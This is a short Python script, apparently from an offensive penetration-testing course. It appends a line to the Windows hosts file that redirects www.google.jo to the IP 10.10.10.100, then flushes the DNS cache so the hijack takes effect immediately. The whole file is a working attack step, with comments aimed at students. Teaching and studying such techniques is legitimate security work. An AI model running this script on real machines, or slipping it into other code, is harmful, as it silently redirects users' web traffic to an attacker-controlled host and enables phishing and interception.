# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


# Good to read  https://en.wikipedia.org/wiki/Hosts_(file)


import subprocess
import os

os.chdir("C:\Windows\System32\drivers\etc") # change the script directory to ..\etc where the host file is located on windows


command = "echo 10.10.10.100 www.google.jo >> hosts"  # Appened this line to the host file, where it should redirect
                                                      # traffic going to google.jo to IP of 10.10.10.100
CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

command = "ipconfig /flushdns" # flush the cached dns, to make sure that new sessions will take the new DNS record
CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

